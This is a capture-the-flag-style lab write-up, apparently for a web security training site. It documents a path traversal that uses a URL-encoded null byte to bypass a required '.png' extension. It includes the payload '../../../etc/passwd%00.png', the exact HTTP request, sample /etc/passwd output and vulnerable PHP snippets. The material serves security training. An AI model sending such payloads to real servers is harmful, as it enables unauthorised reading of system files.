# File Path Traversal with Null Byte Bypass

## Lab Information

| Field | Value |
|-------|-------|
| **Lab** | File path traversal with null byte bypass |
| **Category** | Path Traversal / Directory Traversal |
| **Severity** | High |
| **CWE** | CWE-22 – Improper Limitation of a Pathname to a Restricted Directory |
| **OWASP Top 10** | A01:2021 – Broken Access Control |

---

# Executive Summary

The application was vulnerable to a **Path Traversal** vulnerability due to improper handling of **null byte (`%00`) injection**. Although the application attempted to enforce a `.png` extension on user-supplied filenames, it failed to sanitize null bytes before passing the path to the underlying filesystem.

By injecting a URL-encoded null byte (`%00`) before the expected extension, it was possible to truncate the filename at the operating system level and access arbitrary files outside the intended directory.

The vulnerability was successfully exploited to retrieve the contents of the Linux `/etc/passwd` file.

---

# Objective

Retrieve the contents of:

```text
/etc/passwd
```

---

# Vulnerability Discovery

While browsing a product page, the application requested product images through the following endpoint:

```http
GET /image?filename=6.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

The application accepted only image files and appeared to require the `.png` extension.

A classic Path Traversal payload such as:

```text
../../../etc/passwd
```

was not sufficient because the application expected an image filename.

---

# Exploitation

A URL-encoded null byte (`%00`) was injected immediately before the required extension.

Payload:

```text
../../../etc/passwd%00.png
```

Modified request:

```http
GET /image?filename=../../../etc/passwd%00.png HTTP/2
Host: LAB-ID.web-security-academy.net
```

---

# Result

The server returned the contents of the Linux password file.

Example:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/usr/sbin:/usr/sbin/nologin
...
```

The lab was automatically marked as solved after successfully retrieving the file.

---

# Technical Analysis

The application attempted to restrict access to image files by requiring a `.png` extension.

A simplified implementation could resemble:

```php
$filename = $_GET['filename'];

readfile($filename);
```

or

```php
readfile($filename . ".png");
```

The supplied payload:

```text
../../../etc/passwd%00.png
```

is URL-decoded into:

```text
../../../etc/passwd\0.png
```

where `\0` represents the **null byte**.

In vulnerable implementations, native filesystem functions written in C interpret the null byte as the end of the string.

As a result, the operating system effectively receives:

```text
../../../etc/passwd
```

and ignores everything after the null byte:

```text
.png
```

